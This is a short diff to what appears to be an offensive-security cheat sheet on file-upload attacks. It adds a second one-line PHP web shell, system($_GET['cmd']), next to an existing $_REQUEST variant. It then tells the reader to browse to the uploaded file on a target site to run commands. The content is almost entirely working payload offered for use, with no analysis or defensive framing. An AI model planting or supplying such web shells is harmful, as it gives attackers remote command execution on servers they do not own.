@@ -71,6 +71,10 @@ Simple PHP CMD shell:
 <?php system($_REQUEST['cmd']); ?>
 ```
 
+```php
+<?php system($_GET['cmd']); ?>
+```
+
 Navigate to uploaded file:
 
 `www.example.com/uploads/myfile.php`
